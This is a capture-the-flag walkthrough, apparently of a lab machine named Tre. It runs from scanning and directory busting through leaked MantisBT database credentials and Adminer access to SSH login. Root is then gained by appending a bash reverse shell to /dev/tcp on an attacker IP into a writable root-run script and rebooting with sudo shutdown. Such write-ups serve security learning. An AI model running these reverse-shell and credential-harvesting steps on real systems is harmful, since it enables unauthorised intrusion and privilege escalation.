### Initial Foothold
Run autorecon on 192.168.122.84
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
|_http-title: Tre
|_http-server-header: Apache/2.4.38 (Debian)
8082/tcp open  http    syn-ack ttl 61 nginx 1.14.2
| http-methods: 
|_Supported Methods: GET HEAD
```
Port 8082 is a clone of port 80 with nothing interesting there.
Directory buster on port 80.
```
http://192.168.122.84/cms/site/
http://192.168.122.84/index.html
http://192.168.122.84/info.php http://192.168.122.84/system
http://192.168.122.84/adminer.php
http://192.168.122.84/mantisbt/
```
/adminer.php shows an interesting database site however we do not have the credentials to login.
Further directory buster on /mantisbt.
```
feroxbuster -u http://192.168.191.84/mantisbt -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x html,php
http://192.168.191.84/mantisbt/config/a.txt
```
Found a strange file under config named a.txt.
```
# --- Database Configuration ---
$g_hostname      = 'localhost';
$g_db_username   = 'mantissuser';
$g_db_password   = 'password@123AS';
$g_database_name = 'mantis';
$g_db_type       = 'mysqli';
```
login to adminer.php with the above credentials and under mantis_user_table
```
administrator	XiBejMub	root@localhost	3492f8fe2cb409e387ddb0521c999c38
tre	           Tr3@123456A!	tre@localhost	64c4685f8da5c2225de7890c1bad0d7f
```
Only managed to gain ssh with `tre:Tr3@123456A!`.

### Privesc
sudo -l shows root privilege on `shutdown`
No suspicious suid or capabilities.

Use `pspy64` to monitor for hidden processes:
```
2026/11/15 09:47:40 CMD: UID=0     PID=13508  | /bin/bash /usr/bin/check-system 
2026/11/15 09:47:41 CMD: UID=0     PID=13509  | /bin/bash /usr/bin/check-system 
2026/11/15 09:47:42 CMD: UID=0     PID=13510  | /bin/bash /usr/bin/check-system 
2026/11/15 09:47:43 CMD: UID=0     PID=13511  | /bin/bash /usr/bin/check-system 
ls -la /usr/bin/check-system 
-rw----rw- 1 root root 135 May 12  2020 /usr/bin/check-system
```
check-system is writable by user and is executing every second.

As `nc` is absent,
we will append 
```
#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/192.168.45.189/4444 <&1'
```
system restart to rerun the new script as you have sudo rights with shutdown
```
sudo shutdown -r now
```
Catch penelope shell at 4444 and gain root access.